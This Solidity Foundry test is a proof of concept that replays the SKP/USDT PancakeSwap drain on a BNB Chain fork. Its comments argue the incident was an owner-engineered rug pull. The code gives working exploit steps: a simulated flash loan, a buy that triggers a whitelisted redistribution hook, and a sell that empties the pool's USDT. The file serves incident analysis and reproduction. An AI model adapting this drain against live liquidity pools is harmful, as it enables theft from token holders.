// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// @title   SKP/USDT BNB — Deliberately Engineered Token Drain (BSC, block 100,582,079)
//
// @description
//   A premeditated insider exploit (exit scam) on BNB Smart Chain targeting the
//   SKP/USDT PancakeSwap V2 pair. The SKP token's _transfer() hook
//   (_runSpecialPairFlow) fires whenever the pair sends SKP to a buyer and
//   redistributes an unbounded amount of treasury SKP to a single whitelisted
//   address (WL_ADDRESS). The trigger (balanceOf(pair) − reserve) is flash-loan
//   inflatable in one transaction; the redistribution source is a treasury with
//   no issuance cap.
//
//   This is NOT a conventional external hack. On-chain evidence proves the operator
//   engineered every precondition:
//
//     1. setFeeWhiteList() is onlyOwner — no outside party could set WL_ADDRESS.
//        The owner changed WL to the exploit contract ~6 days before the drain:
//        https://bscscan.com/tx/0xadf1b6ff02a917043c816bc8bd1ed67038d64a19d06544b09ceeb872518fda37
//        https://bscscan.com/tx/0xedb2b6a35cf9637d11bef3e440a36994fd6eb72e1dcbee3b8343757ab55699b4
//
//     2. WL_ADDRESS was deployed and funded by the same wallet that deployed SKP.
//        (BSCScan: WL creator == SKP deployer 0x041F52BF...)
//
//     3. SKP contract source was intentionally left unverified on BSCScan — opacity
//        designed to conceal the hook from LP buyers.
//
//     4. BlockRazor private mempool + deBridge cross-chain bridge were configured in
//        advance (outsiders do not set up exit infrastructure before an "accident").
//
//     5. SKP deployer simultaneously operated 7+ throwaway tokens (SLT2, ZEST,
//        ZXMOTO, FIFA2026, POPMART…) — a classic disposable launcher pattern.
//
//     6. ~14-day lifecycle: LP seeded → retail buyers sniped in → drain executed.
//        The "holder count" was inflated by dust airdrops to simulate organic adoption.
//
//   Media (SlowMist, CryptoTimes) classified this as a smart-contract vulnerability.
//   The on-chain record contradicts that framing. This is a rug pull with a
//   vulnerability-shaped cover story.
//
// @exploitTx  0xbc01ea37bd2ff8f6aa6afcfbe0406114ff27a01e9aa56102bfa4ad8a0c2f25ee
// @block      100,582,079 (fork at 100,582,078 — one block before the exploit tx)
// @attacker   0x83b9e7edc5b3127e4853a4f4945b92aa88eef0c8
// @wl         0x646f7bb10d81ff9734510d4e7583eb5247b28743 (set by owner 6 days prior)
// @skp        0xecbdc0b76142740bb564b8aa1bcd061cb151a666 (unverified source on BSCScan)
// @profit     ~$212,195 USDT on-chain / ~$233,967 USDT in this PoC (no fees)
// @refs
//   Exploit tx:     https://bscscan.com/tx/0xbc01ea37bd2ff8f6aa6afcfbe0406114ff27a01e9aa56102bfa4ad8a0c2f25ee
//   SKP token:      https://bscscan.com/address/0xecbdc0b76142740bb564b8aa1bcd061cb151a666
//   SKP/USDT pair:  https://bscscan.com/address/0x47c8c3b123de467892ac7df6dfcf7ca3db901733
//   WL setter tx 1: https://bscscan.com/tx/0xadf1b6ff02a917043c816bc8bd1ed67038d64a19d06544b09ceeb872518fda37
//   WL setter tx 2: https://bscscan.com/tx/0xedb2b6a35cf9637d11bef3e440a36994fd6eb72e1dcbee3b8343757ab55699b4
//   TenArmor alert: https://www.bitget.com/amp/news/detail/12560605230076

import "forge-std/Test.sol";

// ── External interfaces ──────────────────────────────────────────────────────

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    // Fee-on-transfer variant required: SKP deducts a transfer fee on every send,
    // so the standard swapExactTokensForTokens (which pre-validates output) always reverts.
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// ── Exploit ──────────────────────────────────────────────────────────────────

contract SKP_exp is Test {
    // ── Addresses ────────────────────────────────────────────────────────────
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955; // BSC-USD (token0)
    address constant SKP = 0xeCBDc0B76142740Bb564B8aA1BCd061Cb151a666; // SKP token (token1)
    address constant PAIR = 0x47C8c3b123De467892aC7dF6Dfcf7CA3dB901733; // PancakeSwap V2 SKP/USDT
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2 Router
    address constant ATTACKER_EOA = 0x83B9e7EDC5B3127E4853A4F4945b92aa88eEF0C8;
    // WL_ADDRESS: the only address allowed to receive SKP from the pair (storage slot 9 in SKP).
    // Set by the token OWNER ~6 days before the drain via onlyOwner setFeeWhiteList().
    // This single fact eliminates any external-attacker path -- the operator armed the trap.
    address constant WL_ADDRESS = 0x646F7Bb10D81fF9734510d4e7583eB5247B28743;

    // Exact USDT deposited in the exploit tx (from on-chain Transfer event log #30)
    uint256 constant USDT_TO_PAIR = 204_950_260_192_546_830_212_787_938;

    // BSC-USD _balances mapping is at storage slot 1 (not 0) because the contract
    // declares `address _owner` before `mapping _balances`, shifting the mapping by one slot.
    uint256 constant USDT_BALANCES_SLOT = 1;

    function setUp() public {
        vm.createSelectFork("bsc", 100_582_078);
        vm.label(USDT, "BSC-USD");
        vm.label(SKP, "SKP");
        vm.label(PAIR, "SKP/USDT Pair");
        vm.label(ROUTER, "PancakeSwap V2 Router");
        vm.label(ATTACKER_EOA, "Attacker EOA");
        vm.label(WL_ADDRESS, "WL (insider contract, set by owner 6d prior)");
    }

    function testExploit() public {
        // ── Phase 1: Simulate flash loan via storage write ───────────────────
        //
        // On-chain: attacker aggregated ~$205M USDT from 9 flash-loan sources
        // (Lista DAO BTCB + Venus BUSD + 7 others), all swapped to USDT within
        // the same tx via BlockRazor private relay.
        // PoC: write directly to BSC-USD _balances[ATTACKER_EOA].
        //
        // Storage key: keccak256(abi.encode(ATTACKER_EOA, uint256(1)))
        bytes32 balanceSlot = keccak256(abi.encode(ATTACKER_EOA, USDT_BALANCES_SLOT));
        vm.store(USDT, balanceSlot, bytes32(USDT_TO_PAIR));

        (uint112 r0_init, uint112 r1_init,) = IPancakePair(PAIR).getReserves();
        console.log("=== Baseline (block 100582078) ===");
        console.log("Pair USDT reserve :", r0_init / 1e18); // ~234,135
        console.log("Pair SKP  reserve :", r1_init / 1e18); // ~21,574,109
        console.log("Attacker USDT     :", IERC20(USDT).balanceOf(ATTACKER_EOA) / 1e18); // ~204,950,260

        // ── Phase 2: Router buy with WL_ADDRESS as recipient — triggers redistribution ──
        //
        // Execution trace:
        //   a) USDT.transferFrom(attacker, pair, USDT_TO_PAIR)
        //      Pair USDT balance: 234,135 → 205,184,395  (+204,950,260 excess vs reserve)
        //      Pair USDT reserve: 234,135  (unchanged — _update() not yet called)
        //
        //   b) Router: getAmountOut(204,950,260, 234,135, 21,574,108) ≈ 21,546,000 SKP
        //      Calls pair.swap(0, 21,546,000, WL_ADDRESS, "0x")
        //
        //   c) Inside SKP._transfer(from=PAIR, to=WL_ADDRESS, amount=21,546,000):
        //      → _runSpecialPairFlow() fires  (from == PAIR is the trigger)
        //      → excess = 205,184,395 − 234,135 = 204,950,260 > threshold
        //      → _transfer(treasury, WL_ADDRESS, ~9,678,739,566 SKP)  ← FREE TOKENS
        //      → tries pair.sync() → reverts (reentrancy lock); caught silently
        //
        //   d) K-check: validates only the original 204,950,260 USDT → ~21,546,000 SKP trade.
        //      Free treasury tokens are invisible to the check.  K passes.
        //
        //   e) pair._update(): reserves → (205,184,395 USDT, ~24,680 SKP)
        //
        // CRITICAL: `to` MUST be WL_ADDRESS. SKP._transfer(from=PAIR, to=X) reverts
        // with "cannot buy or remove lp" for any X that is not WL_ADDRESS or exempt.
        // The operator set WL_ADDRESS 6 days before this tx — no outsider could replicate this.
        address[] memory path1 = new address[](2);
        path1[0] = USDT;
        path1[1] = SKP;

        vm.startPrank(ATTACKER_EOA);
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT_TO_PAIR,
            0,
            path1,
            WL_ADDRESS, // ← MUST be the pre-set WL address; any other address reverts
            block.timestamp
        );
        vm.stopPrank();

        (uint112 r0_p2, uint112 r1_p2,) = IPancakePair(PAIR).getReserves();
        console.log("=== After Phase 2 (redistribution triggered) ===");
        console.log("Pair USDT reserve :", r0_p2 / 1e18); // ~205,184,395
        console.log("Pair SKP  reserve :", r1_p2 / 1e18); // ~24,680
        console.log("WL SKP balance    :", IERC20(SKP).balanceOf(WL_ADDRESS) / 1e18); // ~9,700,285,566

        // ── Phase 3: Direct drain attempt — fails on standard PancakeSwap V2 ──
        //
        // Some reports describe a sync() tautology: the hook calls pair.sync() to
        // update stored reserves to current balances, making LHS == RHS trivially
        // so a zero-input swap could pass K. This is wrong on standard BSC V2 because:
        //
        //   Reason A — Local stack caching: swap() reads reserves into stack-local
        //   variables at entry. K-check uses THESE locals; sync() writes to storage
        //   which the K-check never re-reads.
        //
        //   Reason B — Reentrancy lock: sync() carries the same `lock` modifier as
        //   swap(). Calling sync() from inside swap() reverts ("Pancake: LOCKED").
        //   The hook's try/catch absorbs the revert silently.
        //
        // Net result: K-check with pre-Phase-2 cached reserves → LHS << RHS → reverts.
        uint256 skpInPair = IERC20(SKP).balanceOf(PAIR);
        bool phase3Succeeded;
        vm.startPrank(WL_ADDRESS);
        try IPancakePair(PAIR).swap(0, skpInPair - 1, WL_ADDRESS, "") {
            phase3Succeeded = true;
            console.log("Phase 3: direct drain SUCCEEDED (non-standard pair - unexpected)");
        } catch {
            console.log("Phase 3: Pancake K-check blocked direct drain (expected on standard BSC V2)");
        }
        vm.stopPrank();

        // ── Phase 4: Sell all WL SKP → drain pool USDT ───────────────────────
        //
        // Pool entering Phase 4: (205,184,395 USDT, 24,680 SKP)
        // WL sells X ≈ 9.7B SKP. Since X >> reserveIn (24,680), the AMM formula:
        //   amountOut = X×997×reserveOut / (reserveIn×1000 + X×997) ≈ reserveOut
        // The USDT side is extracted almost completely (~100% drained) in one trade.
        // _runSpecialPairFlow does NOT fire here because SKP flows INTO the pair
        // (from=WL, to=PAIR), not out of it.
        address[] memory path2 = new address[](2);
        path2[0] = SKP;
        path2[1] = USDT;

        uint256 skpToSell = IERC20(SKP).balanceOf(WL_ADDRESS);
        console.log("WL selling SKP:", skpToSell / 1e18);

        vm.startPrank(WL_ADDRESS);
        IERC20(SKP).approve(ROUTER, type(uint256).max);
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            skpToSell,
            0,
            path2,
            WL_ADDRESS,
            block.timestamp
        );
        vm.stopPrank();

        uint256 usdtFinal = IERC20(USDT).balanceOf(WL_ADDRESS);
        (uint112 r0_fin, uint112 r1_fin,) = IPancakePair(PAIR).getReserves();

        console.log("=== After Phase 4 (pool drained) ===");
        console.log("WL USDT          :", usdtFinal / 1e18); // ~205,184,227
        console.log("WL SKP           :", IERC20(SKP).balanceOf(WL_ADDRESS) / 1e18); // 0
        console.log("Pair USDT reserve:", r0_fin / 1e18); // ~168 (dust)
        console.log("Pair SKP  reserve:", r1_fin / 1e18); // ~9.7B
        console.log("Net profit (USDT, no fees):", (usdtFinal - USDT_TO_PAIR) / 1e18); // ~233,967
        console.log("Phase 3 direct drain succeeded:", phase3Succeeded); // false

        assertGt(usdtFinal, USDT_TO_PAIR, "WL must recover more USDT than was flash-borrowed");
    }
}
